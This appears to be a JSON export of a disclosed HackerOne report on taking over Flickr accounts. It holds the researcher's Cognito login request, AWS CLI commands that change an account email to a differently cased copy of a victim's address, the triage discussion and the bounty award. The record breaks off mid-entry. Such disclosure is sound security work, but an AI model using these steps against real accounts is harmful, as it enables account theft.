@@ -1,0 +1,897 @@
+{
+  "id": 1342088,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzQyMDg4",
+  "url": "https://hackerone.com/reports/1342088",
+  "title": "Flickr Account Takeover using AWS Cognito API",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2021-09-16T23:41:33.953Z",
+  "submitted_at": "2021-09-16T23:41:34.093Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lauritz",
+    "url": "/lauritz",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 32982,
+    "url": "https://hackerone.com/flickr",
+    "handle": "flickr",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/032/982/553e2f6c6682ebf04363717b01f5413d6e313e62_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/032/982/553e2f6c6682ebf04363717b01f5413d6e313e62_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Flickr",
+      "twitter_handle": "flickr",
+      "website": "https://www.flickr.com/",
+      "about": "Flickr is a global community united by photography.  It is the best place for inspiration, connection and sharing."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-12-18T00:35:49.568Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-12-18T00:23:34.727Z",
+  "team_member_agreed_on_going_public_at": "2021-12-18T00:35:49.269Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Flickr uses [Amazon Cognito](https://aws.amazon.com/de/cognito/) to implement its login functionality.\n\nFurthermore, Flickr does not allow users to change their registered e-mail address via the user interface. This restriction can be bypassed via direct communication with the Amazon Cognito *User Pool* API.\n\nConsider we have the following accounts:\n1. flickr-benign@lauritz-holtmann.de (our victim)\n2. An arbitrary other account that is controlled by the attacker - in the following flickr-attacker@lauritz-holtmann.de\n\nAt first, the malicious actor needs to obtain an Amazon `access_token`. To do so, intercept the login request that is sent from https://identity.flickr.com/:\n```http\nPOST / HTTP/2\nHost: cognito-idp.us-east-1.amazonaws.com\n[...]\n\n{\n    \"AuthFlow\":\"USER_PASSWORD_AUTH\",\n    \"ClientId\":\"3ck15a1ov4f0d3o97vs3tbjb52\",\n    \"AuthParameters\":{\n        \"USERNAME\":\"flickr-attacker@lauritz-holtmann.de\",\n        \"PASSWORD\":\"[REDACTED]\",\n        \"DEVICE_KEY\":\"us-east-1_07032954-25bf-4781-b596-9d675d901072\"\n    },\n    \"ClientMetadata\":\n    {                \n    }\n}\n```\n\nIf the provided credentials for the attacker controlled account are valid, Amazon responds with tokens:\n```http\nHTTP/2 200 OK\nDate: Thu, 16 Sep 2021 22:51:36 GMT\n[...]\n\n{\n    \"AuthenticationResult\":    \n        {\n            \"AccessToken\":\"[REDACTED]\",\n            \"ExpiresIn\":3600,\n            \"IdToken\":\"[REDACTED]\",\n            \"RefreshToken\":\"[REDACTED]\",\n            \"TokenType\":\"Bearer\"\n        },\n    \"ChallengeParameters\":\n        {            \n        }\n}\n```\n\nThe `access_token` can be directly used against Amazon's AWS API, for instance using the [AWS Command Line Interface](https://docs.aws.amazon.com/cli/) tool:\n\n```bash\n$ aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]\n{\n    \"Username\": \"e28c344[...]\",\n    \"UserAttributes\": [\n        {\n            \"Name\": \"sub\",\n            \"Value\": \"e28[...]\"\n        },\n        {\n            \"Name\": \"birthdate\",\n            \"Value\": \"1998-09-17\"\n        },\n        {\n            \"Name\": \"email_verified\",\n            \"Value\": \"true\"\n        },\n        {\n            \"Name\": \"locale\",\n            \"Value\": \"en-us\"\n        },\n        {\n            \"Name\": \"given_name\",\n            \"Value\": \"Axel\"\n        },\n        {\n            \"Name\": \"family_name\",\n            \"Value\": \"Attacker\"\n        },\n        {\n            \"Name\": \"email\",\n            \"Value\": \"flickr-attacker@lauritz-holtmann.de\"\n        }\n    ]\n}\n```\n\nUsing the API, one is able to alter some of the user attributes - including the linked e-mail address:\n```bash\n$ aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=flickr-Benign@lauritz-holtmann.de\n{\n    \"CodeDeliveryDetailsList\": [\n        {\n            \"Destination\": \"f***@l***.de\",\n            \"DeliveryMedium\": \"EMAIL\",\n            \"AttributeName\": \"email\"\n        }\n    ]\n}\n```\n\nNote that the registered address is **case sensitive**.\nAs the above output already indicates, at this stage, the e-mail address is not verified:\n```bash\n$ aws cognito-idp get-user --region us-east-1 --access-token eyJraWQi[...] \n{\n    \"Username\": \"e28c34[...]\",\n    \"UserAttributes\": [\n        {\n            \"Name\": \"sub\",\n            \"Value\": \"e2[...]\"\n        },\n        {\n            \"Name\": \"birthdate\",\n            \"Value\": \"1998-09-17\"\n        },\n        {\n            \"Name\": \"email_verified\",\n            \"Value\": \"false\"\n        },\n        {\n            \"Name\": \"locale\",\n            \"Value\": \"en-us\"\n        },\n        {\n            \"Name\": \"given_name\",\n            \"Value\": \"Axel\"\n        },\n        {\n            \"Name\": \"family_name\",\n            \"Value\": \"Attacker\"\n        },\n        {\n            \"Name\": \"email\",\n            \"Value\": \"flickr-Benign@lauritz-holtmann.de\"\n        }\n    ]\n}\n```\n\nStrikingly, it is still possible to login at Flickr using the case-sensitive, not-verified victim e-mail address using the attacker's password:\n{F1451108}\nAs the above video illustrates, the attacker has to make sure that within the outgoing HTTP request the capitalization of the e-mail address is as intended.\n\n## Conclusion\nThe aforementioned behavior can be tracked down to the following root issues\n1) Flickr does not expect e-mail addresses to be changed - still it is possible to change a user's address using the AWS Cognito API.\n2) Flickr does not check whether the e-mail address is verified on login\n3) Flickr normalizes the e-mail address received from AWS cognito, so that collisions are possible\n\n## Impact\n\nChained as shown above, the aforementioned  vulnerabilities can be used to takeover a user's account without any user interaction. \n\nA malicious solely needs to know the e-mail address that is linked within a victim's account to link a crafted e-mail address to their account that can then be used to takeover the victim's account.\n\n## Further Notices\nAll tests were performed against my user accounts. The user account patterns used were as follows:\n* lauritz+*@wearehackerone.com\n* *@lauritz-holtmann.de\n\nPlease let me know if you have any comments or questions.",
+  "bounty_amount": "7550.0",
+  "formatted_bounty": "$7,550",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1451108,
+      "file_name": "account-takeover.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6v8m4l9i1pnof59kjj30wnuxvat6?response-content-disposition=attachment%3B%20filename%3D%22account-takeover.mov%22%3B%20filename%2A%3DUTF-8%27%27account-takeover.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070633Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=77ee5291bbdfe53dd2467fcedd1ed359a9399baa825e98a2a425af95e785f8e0",
+      "file_size": 30717613,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 395,
+  "voters": [
+    "matrixsoftsec",
+    "p4n7h3rx",
+    "act1on3",
+    "monke",
+    "lizardman",
+    "porcupineyhairs",
+    "xchessy",
+    "datsuraku147",
+    "velociraptorism",
+    "x7q",
+    "and 385 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 14539,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.flickr.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 13496823,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "We've annotated the steps of the report by trying to reproduce, and I'm going to list them here just to understand if we've missed something:\n\n1. Attacker finds victim’s email address: `joe+schmoe@example.com`\n2. Attacker signs up for own flickr account, email may be anything\n3. Attacker obtains their own access token from `identity.flickr.com`\n4. Go to `identity.flickr.com/login`\n5. Open dev tools, network panel, and preserve log\n6. Log in\n7. In the network panel there should be several calls to `cognito-idp.us-east-1.amazonaws.com` \n8. One of these calls should contain an AccessToken in the response body\n\n9 . Attacker uses access token to change their email via aws cli\n10. Choose a cased version of the victim’s email: `joe+Schmoe@example.com`\n11. At this point, the attacker email becomes verified=false, but the account is still confirmed from when they verified their previous email\n12. Attacker goes to log in with the malicious email and the attacker’s password\n13. This won’t work right away since our UI lowercases the email\n14. Use a MITM proxy to edit the email back to the correct case\n15. The attacker is now logged in to their own account, not the victim’s\n\nWe don't see a method in which the access token or email case changing functionality is exposed to third parties without MITM, which is out of scope as per our program.\nCan you confirm our understanding to be correct, or provide more details?\n\nThanks. ",
+      "automated_response": false,
+      "created_at": "2021-09-17T03:00:06.966Z",
+      "updated_at": "2021-09-17T03:02:55.567Z",
+      "actor": {
+        "username": "alexseville",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexseville",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/351/175/abf065d617153e751322bb0666372a703102d6b9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 13496832,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNeedsMoreInfo",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-09-17T03:03:07.030Z",
+      "updated_at": "2021-09-17T03:03:07.030Z",
+      "actor": {
+        "username": "alexseville",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexseville",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/351/175/abf065d617153e751322bb0666372a703102d6b9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 13497331,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNew",
+      "message": "Hi @alexseville,\n\nthank you very much for having a look into this!\n\nYour steps to reproduce look good to me, did this approach work for you the way you summed up the reported behavior?\n\n> We don't see a method in which the access token or email case changing functionality is exposed to third parties without MITM, which is out of scope as per our program.\n\nAs the attacker only needs to modify their own traffic on their device, I do not think the MITM paragraph of your Policy applies here. Alternatively, the attacker could directly obtain the token from AWS via the API and inject it into their own login flow. \n\nThanks again for having a look into this and best regards,\n@lauritz ",
+      "automated_response": false,
+      "created_at": "2021-09-17T05:05:20.942Z",
+      "updated_at": "2021-09-17T05:05:20.942Z",
+      "actor": {
+        "username": "lauritz",
+        "cleared": false,
+        "verified": true,
+        "url": "/lauritz",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 13507545,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for your response.\n\nI feel like we're getting closer to understanding each other.\n\nIt sounds like you agree that the hacker is only able to capture/modify their own traffic, and only able to login to their own account, therefore there isn't a security risk that would be in scope for our program.\n\nFeel free to update the ticket if you can show that the access token of another user can be stolen or that you can login to someone else's account. Otherwise, you can self-close to avoid reputation loss.\n\nThanks for your interest in our program!",
+      "automated_response": false,
+      "created_at": "2021-09-17T15:05:03.767Z",
+      "updated_at": "2021-09-17T15:05:03.767Z",
+      "actor": {
+        "username": "alexseville",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexseville",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/351/175/abf065d617153e751322bb0666372a703102d6b9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 13509720,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @alexseville,\n\nthank you very much for your kind response. The offer to self-close this report is much appreciated.\n\nEven though I have the feeling, too, that we are getting closer to understanding each other, I would like to highlight again, that with this vulnerability, a malicious actor can takeover - to my knowledge - every flickr account. The only thing the attacker needs to know is the used e-mail address.\n\nI attach a screen recording of the full process of taking over **flickr-benign@lauritz-holtmann.de**, from creation of an attacker account to login into the victim account: {F1452098}\n\nIf this would help you during triage, I could also try to takeover one of your accounts as proof. \n\nPlease let me know if you have any further comments or questions.\n\nBest regards,\n@lauritz ",
+      "automated_response": false,
+      "created_at": "2021-09-17T18:25:16.666Z",
+      "updated_at": "2021-09-17T18:25:16.666Z",
+      "actor": {
+        "username": "lauritz",
+        "cleared": false,
+        "verified": true,
+        "url": "/lauritz",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 1452098,
+          "filename": "account-takeover-complete.mov",
+          "type": "video/quicktime",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/b9hhlna2qk2xhl8usmzsse1gganf?response-content-disposition=attachment%3B%20filename%3D%22account-takeover-complete.mov%22%3B%20filename%2A%3DUTF-8%27%27account-takeover-complete.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070633Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=596bc0897b78b570ed0de70d04a4bbbf54187102aecfbd6c1ba697711e53312c"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 13509968,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @lauritz! Thanks for the new screen cap, that's super helpful. Here's a test account I just created, would you mind trying with this one? ruppel+benign@smugmug.com",
+      "automated_response": false,
+      "created_at": "2021-09-17T18:51:10.596Z",
+      "updated_at": "2021-09-17T18:51:10.596Z",
+      "actor": {
+        "username": "rupz0r",
+        "cleared": false,
+        "verified": false,
+        "url": "/rupz0r",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/mSym9XMwoUGPQhA7xbxibger/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 13510021,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNeedsMoreInfo",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-09-17T18:57:11.661Z",
+      "updated_at": "2021-09-17T18:57:11.661Z",
+      "actor": {
+        "username": "rupz0r",
+        "cleared": false,
+        "verified": false,
+        "url": "/rupz0r",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/mSym9XMwoUGPQhA7xbxibger/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 13510165,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNew",
+      "message": "Hi @rupz0r!\n\nI hope you like your new profile picture ;) https://www.flickr.com/people/193956736@N02/\n\n{F1452143}\n\nBest regards,\n@lauritz ",
+      "automated_response": false,
+      "created_at": "2021-09-17T19:15:11.672Z",
+      "updated_at": "2021-09-17T19:15:11.672Z",
+      "actor": {
+        "username": "lauritz",
+        "cleared": false,
+        "verified": true,
+        "url": "/lauritz",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 1452143,
+          "filename": "Screenshot_2021-09-17_at_21.14.11.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7wuvvi3h8hq7iwv5jtm0i8i2slg3?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2021-09-17_at_21.14.11.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2021-09-17_at_21.14.11.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070633Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1ebc8789989feb646fb5644b138925f9f0633a80641702900a126484cd734494"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 13511475,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-09-17T21:15:30.800Z",
+      "updated_at": "2021-09-17T21:15:30.800Z",
+      "actor": {
+        "username": "alexseville",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexseville",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/351/175/abf065d617153e751322bb0666372a703102d6b9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 13511482,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "Thanks for your clarifications, we understand the exploit now.\n\nGreat find!",
+      "automated_response": false,
+      "created_at": "2021-09-17T21:16:01.881Z",
+      "updated_at": "2021-09-17T21:16:01.881Z",
+      "actor": {
+        "url": "/flickr",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/032/982/553e2f6c6682ebf04363717b01f5413d6e313e62_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Flickr"
+        }
+      },
+      "bounty_amount": "7500.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "flickr",
+      "collaborator": {
+        "username": "lauritz",
+        "url": "/lauritz"
+      }
+    },
+    {
+      "id": 13511545,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Wow, thank you very much for the bounty!\n\nPlease let me know if I could further assist. I tried to outline the root causes to which I tracked down the issue in my initial report. \nAs you use an OpenID Connect flow under the hood, I would like to add that the specification explicitly requires to only use the \"sub\" claim to identify a user.\n\nAgain, thanks for your kind triage. :)\n\nHave a nice weekend and best regards,\n@lauritz ",
+      "automated_response": false,
+      "created_at": "2021-09-17T21:30:11.922Z",
+      "updated_at": "2021-09-17T21:30:11.922Z",
+      "actor": {
+        "username": "lauritz",
+        "cleared": false,
+        "verified": true,
+        "url": "/lauritz",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "flickr"
+    },
+    {
+      "id": 13513250,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-09-18T05:11:24.806Z",
+      "updated_at": "2021-09-18T05:11:24.806Z",
+      "actor": {
+        "username": "alexseville",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexseville",
+        "profile_picture_urls": {
